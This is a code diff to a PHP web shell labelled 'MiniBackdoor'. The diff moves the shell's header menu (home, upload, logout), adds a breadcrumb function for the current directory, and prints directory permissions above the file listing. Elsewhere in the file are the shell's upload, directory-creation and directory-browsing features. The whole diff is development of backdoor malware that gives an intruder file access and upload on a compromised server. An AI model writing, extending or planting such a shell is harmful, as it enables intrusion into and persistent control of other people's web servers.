@@ -114,30 +114,6 @@ function cwd() {
   $cwd = @str_replace('\\', '/', @getcwd());
   return $cwd;
 }
-?>
-<table align="center" width="90%">
-  <tr>
-    <th colspan="3">MiniBackdoor</th>
-  </tr>
-  <tr>
-    <td class="header">
-      <center>
-        <a href="?action=home">HOME</a>
-      </center>
-    </td>
-    <td class="header">
-      <center>
-        <?php print @tools("upload") ?>
-      </center>
-    </td>
-    <td class="header">
-      <center>
-        <a href="?action=logout">LOGOUT</a>
-      </center>
-    </td>
-  </tr>
-</table>
-<?php
 function perms($file) {
     $perms = fileperms($file);
     switch ($perms & 0xF000) {
@@ -425,6 +401,18 @@ code {
 <script type="text/javascript">alert(<?php echo "'" . $message . "'"; ?>);</script>
 <?php
 }
+function pwd() {
+  $dir = @explode('/', @cwd());
+  foreach ($dir as $key => $pwd) {
+    print("<a href='?dir=");
+    for ($i=0; $i <= $key ; $i++) { 
+      print($dir[$i]);
+      if ($i != $key) {
+        print("/");
+      }
+    } print("'>".$pwd."</a>/");
+  }
+}
 function tools($toolsname = null) {
 if ($toolsname === 'upload') {
     if (isset($_POST['upload'])) {
@@ -613,6 +601,28 @@ if (@$_POST['do'] == 'makedir') {
   <?php
 }
 ?>
+<table align="center" width="90%">
+  <tr>
+    <th colspan="3">MiniBackdoor</th>
+  </tr>
+  <tr>
+    <td class="header">
+      <center>
+        <a href="?action=home">HOME</a>
+      </center>
+    </td>
+    <td class="header">
+      <center>
+        <?php print @tools("upload") ?>
+      </center>
+    </td>
+    <td class="header">
+      <center>
+        <a href="?action=logout">LOGOUT</a>
+      </center>
+    </td>
+  </tr>
+</table>
 <table width="90%" align="center" border="0">
     </th>
   </tr>
@@ -623,6 +633,7 @@ if (@$_POST['do'] == 'makedir') {
     <th>Action</th>
   </tr>
 <?php
+?> <center><?php print @pwd() ?>[ <?php print @writable(@cwd(), @perms(@cwd())) ?> ]</center> <?php
 foreach (@scandir(@cwd()) as $dir) {
   if (!is_dir($dir)) continue;
   if ($dir === '.' || $dir === '..') {
